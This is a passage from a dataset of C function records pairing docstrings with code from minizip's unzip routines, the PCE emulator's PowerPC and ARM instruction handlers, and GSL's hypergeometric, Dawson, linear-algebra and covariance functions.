(unzFile)s;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n   Compare two filename (fileName1,fileName2).\n   If iCaseSenisivity = 1, comparision is case sensitivity (like strcmp)\n   If iCaseSenisivity = 2, comparision is not case sensitivity (like strcmpi\n                                                                or strcasecmp)\n   If iCaseSenisivity = 0, case sensitivity is defaut of your operating system\n        (like 1 on Unix, 2 on Windows)\n\n*/\n", "func_signal": "extern int ZEXPORT unzStringFileNameCompare (const char*  fileName1,\n                                                 const char*  fileName2,\n                                                 int iCaseSensitivity)", "code": "{\n    if (iCaseSensitivity==0)\n        iCaseSensitivity=CASESENSITIVITYDEFAULTVALUE;\n\n    if (iCaseSensitivity==1)\n        return strcmp(fileName1,fileName2);\n\n    return STRCMPCASENOSENTIVEFUNCTION(fileName1,fileName2);\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  return 1 if the end of file was reached, 0 elsewhere\n*/\n", "func_signal": "extern int ZEXPORT unzeof (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    if (pfile_in_zip_read_info->rest_read_uncompressed == 0)\n        return 1;\n    else\n        return 0;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem.\n*/\n", "func_signal": "extern int ZEXPORT unzGetCurrentFileInfo64 (unzFile file,\n                                          unz_file_info64 * pfile_info,\n                                          char * szFileName, uLong fileNameBufferSize,\n                                          void *extraField, uLong extraFieldBufferSize,\n                                          char* szComment,  uLong commentBufferSize)", "code": "{\n    return unz64local_GetCurrentFileInfoInternal(file,pfile_info,NULL,\n                                                szFileName,fileNameBufferSize,\n                                                extraField,extraFieldBufferSize,\n                                                szComment,commentBufferSize);\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/* 13 000: mcrf bf, bfa */\n", "func_signal": "static\nvoid op_13_000 (p405_t *c)", "code": "{\n\tunsigned bft, bfa;\n\n\tif (p405_check_reserved (c, 0x0063f801UL)) {\n\t\treturn;\n\t}\n\n\tbft = p405_get_ir_rt (c->ir) >> 2;\n\tbfa = p405_get_ir_ra (c->ir) >> 2;\n\n\tp405_set_crf (c, bft, p405_get_crf (c, bfa));\n\n\tp405_set_clk (c, 4, 1);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 1C: bic[cond][s] rd, rn, shifter_operand */\n", "func_signal": "static void opd1c (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_0b (da);\n\t}\n\telse {\n\t\tdasm_op3 (da, \"bic\", FLG_COND | FLG_S, ARG_RD, ARG_RN, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 06: rsb[cond][s] rd, rn, shifter_operand */\n", "func_signal": "static void opd06 (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_0b (da);\n\t}\n\telse {\n\t\tdasm_op3 (da, \"rsb\", FLG_COND | FLG_S, ARG_RD, ARG_RN, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 1c1: cror bt, ba, bb */\n", "func_signal": "static\nvoid op_13_1c1 (p405_t *c)", "code": "{\n\tp405_op_crop (c,\n\t\tp405_get_ir_rt (c->ir), p405_get_ir_ra (c->ir), p405_get_ir_rb (c->ir),\n\t\tcrop_or\n\t);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 1E: mvn[cond][s] rd, shifter_operand */\n", "func_signal": "static void opd1e (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_0b (da);\n\t}\n\telse {\n\t\tdasm_op2 (da, \"mvn\", FLG_COND | FLG_S, ARG_RD, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 02: eor[cond][s] rd, rn, shifter_operand */\n", "func_signal": "static void opd02 (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd02_ext (da);\n\t}\n\telse {\n\t\tdasm_op3 (da, \"eor\", FLG_COND | FLG_S, ARG_RD, ARG_RN, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 021: crnor bt, ba, bb */\n", "func_signal": "static\nvoid op_13_021 (p405_t *c)", "code": "{\n\tp405_op_crop (c,\n\t\tp405_get_ir_rt (c->ir), p405_get_ir_ra (c->ir), p405_get_ir_rb (c->ir),\n\t\tcrop_nor\n\t);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 096: isync */\n", "func_signal": "static\nvoid op_13_096 (p405_t *c)", "code": "{\n\tif (p405_check_reserved (c, 0x03fff800UL)) {\n\t\treturn;\n\t}\n\n\tp405_set_clk (c, 4, 1);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 16 08: smulxy[cond] rd, rm, rs */\n", "func_signal": "static void opd16_08 (arm_dasm_t *da)", "code": "{\n\tchar op[16];\n\n\tstrcpy (op, \"smul\");\n\tstrcat (op, arm_get_bit (da->ir, 5) ? \"t\" : \"b\");\n\tstrcat (op, arm_get_bit (da->ir, 6) ? \"t\" : \"b\");\n\n\tdasm_op3 (da, op, FLG_COND, ARG_RN, ARG_RM, ARG_RS);\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 40: ldr/str[cond][b][t] rd, address */\n", "func_signal": "static void opd40 (arm_dasm_t *da)", "code": "{\n\tif (arm_get_bit (da->ir, 20)) {\n\t\tdasm_op2 (da, \"ldr\", FLG_COND, ARG_RD, ARG_AMODE2);\n\t}\n\telse {\n\t\tdasm_op2 (da, \"str\", FLG_COND, ARG_RD, ARG_AMODE2);\n\t}\n\n\tif (arm_get_bit (da->ir, 22)) {\n\t\tstrcat (da->op, \"b\");\n\t}\n\n\tif ((arm_get_bit (da->ir, 24) == 0) && (arm_get_bit (da->ir, 21) == 1)) {\n\t\tstrcat (da->op, \"t\");\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 04: sub[cond][s] rd, rn, shifter_operand */\n", "func_signal": "static void opd04 (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_0b (da);\n\t}\n\telse {\n\t\tdasm_op3 (da, \"sub\", FLG_COND | FLG_S, ARG_RD, ARG_RN, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 12 03: blx[cond] rm */\n", "func_signal": "static void opd12_03 (arm_dasm_t *da)", "code": "{\n\tdasm_op1 (da, \"blx\", FLG_COND, ARG_RM);\n\n\tda->flags |= ARM_DFLAG_CALL;\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 081: crandc bt, ba, bb */\n", "func_signal": "static\nvoid op_13_081 (p405_t *c)", "code": "{\n\tp405_op_crop (c,\n\t\tp405_get_ir_rt (c->ir), p405_get_ir_ra (c->ir), p405_get_ir_rb (c->ir),\n\t\tcrop_andc\n\t);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 12 07: bkpt uimm16 */\n", "func_signal": "static void opd12_07 (arm_dasm_t *da)", "code": "{\n\tuint32_t v;\n\n\tv = (da->ir & 0x0f) | ((da->ir >> 4) & 0xfff0);\n\n\tdasm_op0 (da, \"bkpt\", FLG_COND);\n\tda->argn = dasm_arg (da->arg[0], da->arg[1], v, ARG_UIMM16);\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 00: and[cond][s] rd, rn, shifter_operand */\n", "func_signal": "static void opd00 (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_ext (da);\n\t}\n\telse {\n\t\tdasm_op3 (da, \"and\", FLG_COND | FLG_S, ARG_RD, ARG_RN, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* E0 01: mcr[cond] coproc, opcode1, rd, crn, crm, opcode2 */\n", "func_signal": "static void opde0_01 (arm_dasm_t *da)", "code": "{\n\tunsigned n;\n\n\tif (arm_get_bits (da->ir, 28, 4) == 0x0f) {\n\t\tdasm_op0 (da, \"mcr2\", FLG_NONE);\n\t}\n\telse {\n\t\tdasm_op0 (da, \"mcr\", FLG_COND);\n\t}\n\n\tn = dasm_arg (da->arg[0], da->arg[1], da->ir, ARG_COPR);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_COPR_OP1);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_RD);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_CN);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_CM);\n\n\tif (arm_get_bits (da->ir, 5, 3) != 0) {\n\t\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_COPR_OP2);\n\t}\n\n\tda->argn = n;\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 1A: mov[cond][s] rd, shifter_operand */\n", "func_signal": "static void opd1a (arm_dasm_t *da)", "code": "{\n\tif (arm_is_shext (da->ir)) {\n\t\topd00_0b (da);\n\t}\n\telse {\n\t\tdasm_op2 (da, \"mov\", FLG_COND | FLG_S, ARG_RD, ARG_SH);\n\t}\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 0c1: crxor bt, ba, bb */\n", "func_signal": "static\nvoid op_13_0c1 (p405_t *c)", "code": "{\n\tp405_op_crop (c,\n\t\tp405_get_ir_rt (c->ir), p405_get_ir_ra (c->ir), p405_get_ir_rb (c->ir),\n\t\tcrop_xor\n\t);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* 13 010: bclr/bclrl */\n", "func_signal": "static\nvoid op_13_010 (p405_t *c)", "code": "{\n\tp405_op_branch (c,\n\t\tp405_get_lr (c) & 0xfffffffcUL,\n\t\t(c->ir >> 21) & 0x1f, (c->ir >> 16) & 0x1f,\n\t\t1, (c->ir & P405_IR_LK) != 0\n\t);\n}", "path": "pce/src/cpu/ppc405/opcode13.c", "commit_date": "2009-01-20 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/* E0 11: mrc[cond] coproc, opcode1, rd, crn, crm, opcode2 */\n", "func_signal": "static void opde0_11 (arm_dasm_t *da)", "code": "{\n\tunsigned n;\n\n\tif (arm_get_bits (da->ir, 28, 4) == 0x0f) {\n\t\tdasm_op0 (da, \"mrc2\", FLG_NONE);\n\t}\n\telse {\n\t\tdasm_op0 (da, \"mrc\", FLG_COND);\n\t}\n\n\tn = dasm_arg (da->arg[0], da->arg[1], da->ir, ARG_COPR);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_COPR_OP1);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_RD);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_CN);\n\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_CM);\n\n\tif (arm_get_bits (da->ir, 5, 3) != 0) {\n\t\tn += dasm_arg (da->arg[n], da->arg[n + 1], da->ir, ARG_COPR_OP2);\n\t}\n\n\tda->argn = n;\n}", "path": "pce/src/cpu/arm/disasm.c", "commit_date": "2011-04-05 00:00:00", "repo_name": "jsdf/pce", "stars": 842, "license": "gpl-2.0", "language": "c", "size": 11090}
{"docstring": "/*-*-*-*-*-*-*-*-*-*-*-* Functions with Error Codes *-*-*-*-*-*-*-*-*-*-*-*/\n", "func_signal": "int\ngsl_sf_hyperg_1F1_int_e(const int a, const int b, const double x, gsl_sf_result * result)", "code": "{\n  /* CHECK_POINTER(result) */\n\n  if(x == 0.0) {\n    result->val = 1.0;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else if(a == b) {\n    return gsl_sf_exp_e(x, result);\n  }\n  else if(b == 0) {\n    DOMAIN_ERROR(result);\n  }\n  else if(a == 0) {\n    result->val = 1.0;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else if(b < 0 && (a < b || a > 0)) {\n    /* Standard domain error due to singularity. */\n    DOMAIN_ERROR(result);\n  }\n  else if(x > 100.0  && GSL_MAX_DBL(1.0,fabs(b-a))*GSL_MAX_DBL(1.0,fabs(1-a)) < 0.5 * x) {\n    /* x -> +Inf asymptotic */\n    return hyperg_1F1_asymp_posx(a, b, x, result);\n  }\n  else if(x < -100.0 && GSL_MAX_DBL(1.0,fabs(a))*GSL_MAX_DBL(1.0,fabs(1+a-b)) < 0.5 * fabs(x)) {\n    /* x -> -Inf asymptotic */\n    return hyperg_1F1_asymp_negx(a, b, x, result);\n  }\n  else if(a < 0 && b < 0) {\n    return hyperg_1F1_ab_negint(a, b, x, result);\n  }\n  else if(a < 0 && b > 0) {\n    /* Use Kummer to reduce it to the positive integer case.\n     * Note that b > a, strictly, since we already trapped b = a.\n     */\n    gsl_sf_result Kummer_1F1;\n    int stat_K = hyperg_1F1_ab_posint(b-a, b, -x, &Kummer_1F1);\n    int stat_e = gsl_sf_exp_mult_err_e(x, GSL_DBL_EPSILON * fabs(x),\n                                      Kummer_1F1.val, Kummer_1F1.err,\n                                      result); \n    return GSL_ERROR_SELECT_2(stat_e, stat_K);\n  }\n  else {\n    /* a > 0 and b > 0 */\n    return hyperg_1F1_ab_posint(a, b, x, result);\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Solves the system x^T A = b^T using the P^T L Q  factorisation,\n\n   z^T L = b^T Q^T \n\n   x = P z;\n\n   to obtain x. Based on SLATEC code. */\n", "func_signal": "int\ngsl_linalg_PTLQ_solve_T (const gsl_matrix * QR,\n                         const gsl_vector * tau,\n                         const gsl_permutation * p,\n                         const gsl_vector * b,\n                         gsl_vector * x)", "code": "{\n  if (QR->size1 != QR->size2)\n    {\n      GSL_ERROR (\"QR matrix must be square\", GSL_ENOTSQR);\n    }\n  else if (QR->size2 != p->size)\n    {\n      GSL_ERROR (\"matrix size must match permutation size\", GSL_EBADLEN);\n    }\n  else if (QR->size2 != b->size)\n    {\n      GSL_ERROR (\"matrix size must match b size\", GSL_EBADLEN);\n    }\n  else if (QR->size1 != x->size)\n    {\n      GSL_ERROR (\"matrix size must match solution size\", GSL_EBADLEN);\n    }\n  else\n    {\n      gsl_vector_memcpy (x, b);\n\n      gsl_linalg_PTLQ_svx_T (QR, tau, p, x);\n      \n      return GSL_SUCCESS;\n    }\n}", "path": "gsl/linalg/ptlq.c", "commit_date": "2020-03-31 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Compute the covariance matrix\n\n   cov = inv (J^T J)\n\n   by QRP^T decomposition of J\n*/\n", "func_signal": "int\ngsl_multifit_covar (const gsl_matrix * J, const double epsrel, gsl_matrix * covar)", "code": "{\n  int status;\n  gsl_matrix * r;\n  gsl_vector * tau;\n  gsl_vector * norm;\n  gsl_permutation * perm;\n  const size_t m = J->size1;\n  const size_t n = J->size2;\n  \n  if (m < n) \n    {\n      GSL_ERROR (\"Jacobian be rectangular M x N with M >= N\", GSL_EBADLEN);\n    }\n\n  if (covar->size1 != covar->size2 || covar->size1 != n)\n    {\n      GSL_ERROR (\"covariance matrix must be square and match second dimension of jacobian\", GSL_EBADLEN);\n    }\n\n  r = gsl_matrix_alloc (m, n);\n  tau = gsl_vector_alloc (n);\n  perm = gsl_permutation_alloc (n) ;\n  norm = gsl_vector_alloc (n) ;\n  \n  {\n    int signum = 0;\n    gsl_matrix_memcpy (r, J);\n    gsl_linalg_QRPT_decomp (r, tau, perm, &signum, norm);\n  }\n  \n  status = gsl_multifit_covar_QRPT(r, perm, epsrel, covar);\n\n  gsl_matrix_free (r);\n  gsl_permutation_free (perm);\n  gsl_vector_free (tau);\n  gsl_vector_free (norm);\n\n  return status;\n}", "path": "gsl/multifit/covar.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Asymptotic result from Slater 4.3.7 \n * \n * To get the general series, write M(a,b,x) as\n *\n *  M(a,b,x)=sum ((a)_n/(b)_n) (x^n / n!)\n *\n * and expand (b)_n in inverse powers of b as follows\n *\n * -log(1/(b)_n) = sum_(k=0)^(n-1) log(b+k)\n *             = n log(b) + sum_(k=0)^(n-1) log(1+k/b)\n *\n * Do a taylor expansion of the log in 1/b and sum the resulting terms\n * using the standard algebraic formulas for finite sums of powers of\n * k.  This should then give\n *\n * M(a,b,x) = sum_(n=0)^(inf) (a_n/n!) (x/b)^n * (1 - n(n-1)/(2b) \n *                          + (n-1)n(n+1)(3n-2)/(24b^2) + ...\n *\n * which can be summed explicitly. The trick for summing it is to take\n * derivatives of sum_(i=0)^(inf) a_n*y^n/n! = (1-y)^(-a);\n *\n * [BJG 16/01/2007]\n */\n", "func_signal": "static \nint\nhyperg_1F1_largebx(const double a, const double b, const double x, gsl_sf_result * result)", "code": "{\n  double y = x/b;\n  double f = exp(-a*log1p(-y));\n  double t1 = -((a*(a+1.0))/(2*b))*pow((y/(1.0-y)),2.0);\n  double t2 = (1/(24*b*b))*((a*(a+1)*y*y)/pow(1-y,4))*(12+8*(2*a+1)*y+(3*a*a-a-2)*y*y);\n  double t3 = (-1/(48*b*b*b*pow(1-y,6)))*a*((a + 1)*((y*((a + 1)*(a*(y*(y*((y*(a - 2) + 16)*(a - 1)) + 72)) + 96)) + 24)*pow(y, 2)));\n  result->val = f * (1 + t1 + t2 + t3);\n  result->err = 2*fabs(f*t3) + 2*GSL_DBL_EPSILON*fabs(result->val);\n  return GSL_SUCCESS;\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/*-*-*-*-*-*-*-*-*-*-*-* Functions with Error Codes *-*-*-*-*-*-*-*-*-*-*-*/\n", "func_signal": "int\ngsl_sf_dawson_e(double x, gsl_sf_result * result)", "code": "{\n  const double xsml = 1.225 * GSL_SQRT_DBL_EPSILON;\n  const double xbig = 1.0/(M_SQRT2*GSL_SQRT_DBL_EPSILON);\n  const double xmax = 0.1 * GSL_DBL_MAX;\n\n  const double y = fabs(x);\n\n  if(y < xsml) {\n    result->val = x;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else if(y < 1.0) {\n    gsl_sf_result result_c;\n    cheb_eval_e(&daw_cs, 2.0*y*y - 1.0, &result_c);\n    result->val = x * (0.75 + result_c.val);\n    result->err = y * result_c.err;\n    result->err += 2.0 * GSL_DBL_EPSILON * fabs(result->val);\n    return GSL_SUCCESS;\n  }\n  else if(y < 4.0) {\n    gsl_sf_result result_c;\n    cheb_eval_e(&daw2_cs, 0.125*y*y - 1.0, &result_c);\n    result->val = x * (0.25 + result_c.val);\n    result->err = y * result_c.err;\n    result->err += 2.0 * GSL_DBL_EPSILON * fabs(result->val);\n    return GSL_SUCCESS;\n  }\n  else if(y < xbig) {\n    gsl_sf_result result_c;\n    cheb_eval_e(&dawa_cs, 32.0/(y*y) - 1.0, &result_c);\n    result->val  = (0.5 + result_c.val) / x;\n    result->err  = result_c.err / y;\n    result->err += 2.0 * GSL_DBL_EPSILON * fabs(result->val);\n    return GSL_SUCCESS;\n  }\n  else if(y < xmax) {\n    result->val = 0.5/x;\n    result->err = 2.0 * GSL_DBL_EPSILON * result->val;\n    return GSL_SUCCESS;\n  }\n  else {\n    UNDERFLOW_ERROR(result);\n  }\n}", "path": "gsl/specfunc/dawson.c", "commit_date": "2012-08-31 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Assumes b != integer\n * Assumes a != integer when x > 0\n * Assumes b-a != neg integer when x < 0\n */\n", "func_signal": "static\nint\nhyperg_1F1_ab_neg(const double a, const double b, const double x,\n                  gsl_sf_result * result)", "code": "{\n  const double bma = b - a;\n  const double abs_x = fabs(x);\n  const double abs_a = fabs(a);\n  const double abs_b = fabs(b);\n  const double size_a = GSL_MAX(abs_a, 1.0);\n  const double size_b = GSL_MAX(abs_b, 1.0);\n  const int bma_integer = ( bma - floor(bma+0.5) < _1F1_INT_THRESHOLD );\n\n  if(   (abs_a < 10.0 && abs_b < 10.0 && abs_x < 5.0)\n     || (b > 0.8*GSL_MAX(fabs(a),1.0)*fabs(x))\n    ) {\n    return gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n  }\n  else if(   x > 0.0\n          && size_b > size_a\n          && size_a*log(M_E*x/size_b) < GSL_LOG_DBL_EPSILON+7.0\n    ) {\n    /* Series terms are positive definite up until\n     * there is a sign change. But by then the\n     * terms are small due to the last condition.\n     */\n    return gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n  }\n  else if(   (abs_x < 5.0 && fabs(bma) < 10.0 && abs_b < 10.0)\n          || (b > 0.8*GSL_MAX_DBL(fabs(bma),1.0)*abs_x)\n    ) {\n    /* Use Kummer transformation to render series safe.\n     */\n    gsl_sf_result Kummer_1F1;\n    int stat_K = gsl_sf_hyperg_1F1_series_e(bma, b, -x, &Kummer_1F1);\n    int stat_e = gsl_sf_exp_mult_err_e(x, GSL_DBL_EPSILON * fabs(x),\n                                      Kummer_1F1.val, Kummer_1F1.err,\n                                      result);\n    return GSL_ERROR_SELECT_2(stat_e, stat_K);\n  }\n  else if(   x < -30.0\n          && GSL_MAX_DBL(fabs(a),1.0)*GSL_MAX_DBL(fabs(1.0+a-b),1.0) < 0.99*fabs(x)\n    ) {\n    /* Large negative x asymptotic.\n     * Note that we do not check if b-a is a negative integer.\n     */\n    return hyperg_1F1_asymp_negx(a, b, x, result);\n  }\n  else if(   x > 100.0\n          && GSL_MAX_DBL(fabs(bma),1.0)*GSL_MAX_DBL(fabs(1.0-a),1.0) < 0.99*fabs(x)\n    ) {\n    /* Large positive x asymptotic.\n     * Note that we do not check if a is a negative integer.\n     */\n    return hyperg_1F1_asymp_posx(a, b, x, result);\n  }\n  else if(x > 0.0 && !(bma_integer && bma > 0.0)) {\n    return hyperg_1F1_U(a, b, x, result);\n  }\n  else {\n    /* FIXME:  if all else fails, try the series... BJG */\n    if (x < 0.0) {\n      /* Apply Kummer Transformation */\n      int status = gsl_sf_hyperg_1F1_series_e(b-a, b, -x, result);\n      double K_factor = exp(x);\n      result->val *= K_factor;\n      result->err *= K_factor;\n      return status;\n    } else {\n      int status = gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n      return status;\n    }\n\n    /* Sadness... */\n    /* result->val = 0.0; */\n    /* result->err = 0.0; */\n    /* GSL_ERROR (\"error\", GSL_EUNIMPL); */\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Assumes a <= -1,  b <= -1, and b <= a.\n */\n", "func_signal": "static\nint\nhyperg_1F1_ab_negint(const int a, const int b, const double x, gsl_sf_result * result)", "code": "{\n  if(x == 0.0) {\n    result->val = 1.0;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else if(x > 0.0) {\n    return hyperg_1F1_a_negint_poly(a, b, x, result);\n  }\n  else {\n    /* Apply a Kummer transformation to make x > 0 so\n     * we can evaluate the polynomial safely. Of course,\n     * this assumes b <= a, which must be true for\n     * a<0 and b<0, since otherwise the thing is undefined.\n     */\n    gsl_sf_result K;\n    int stat_K = hyperg_1F1_a_negint_poly(b-a, b, -x, &K);\n    int stat_e = gsl_sf_exp_mult_err_e(x, 2.0 * GSL_DBL_EPSILON * fabs(x),\n                                          K.val, K.err,\n                                          result);\n    return GSL_ERROR_SELECT_2(stat_e, stat_K);\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Asymptotic result for 1F1(a, b, x)  x -> +Infinity\n * Assumes b != neg integer and a != neg integer\n */\n", "func_signal": "static\nint\nhyperg_1F1_asymp_posx(const double a, const double b, const double x,\n                      gsl_sf_result * result)", "code": "{\n  gsl_sf_result lg_b;\n  gsl_sf_result lg_a;\n  double sgn_b;\n  double sgn_a;\n\n  int stat_b = gsl_sf_lngamma_sgn_e(b, &lg_b, &sgn_b);\n  int stat_a = gsl_sf_lngamma_sgn_e(a, &lg_a, &sgn_a);\n\n  if(stat_a == GSL_SUCCESS && stat_b == GSL_SUCCESS) {\n    gsl_sf_result F;\n    int stat_F = gsl_sf_hyperg_2F0_series_e(b-a, 1.0-a, 1.0/x, -1, &F);\n    if(stat_F == GSL_SUCCESS && F.val != 0) {\n      double lnx = log(x);\n      double ln_term_val = (a-b)*lnx;\n      double ln_term_err = 2.0 * GSL_DBL_EPSILON * (fabs(a) + fabs(b)) * fabs(lnx)\n                         + 2.0 * GSL_DBL_EPSILON * fabs(a-b);\n      double ln_pre_val = lg_b.val - lg_a.val + ln_term_val + x;\n      double ln_pre_err = lg_b.err + lg_a.err + ln_term_err + 2.0 * GSL_DBL_EPSILON * fabs(x);\n      int stat_e = gsl_sf_exp_mult_err_e(ln_pre_val, ln_pre_err,\n                                            sgn_a*sgn_b*F.val, F.err,\n                                            result);\n      return GSL_ERROR_SELECT_2(stat_e, stat_F);\n    }\n    else {\n      result->val = 0.0;\n      result->err = 0.0;\n      return stat_F;\n    }\n  }\n  else {\n    DOMAIN_ERROR(result);\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
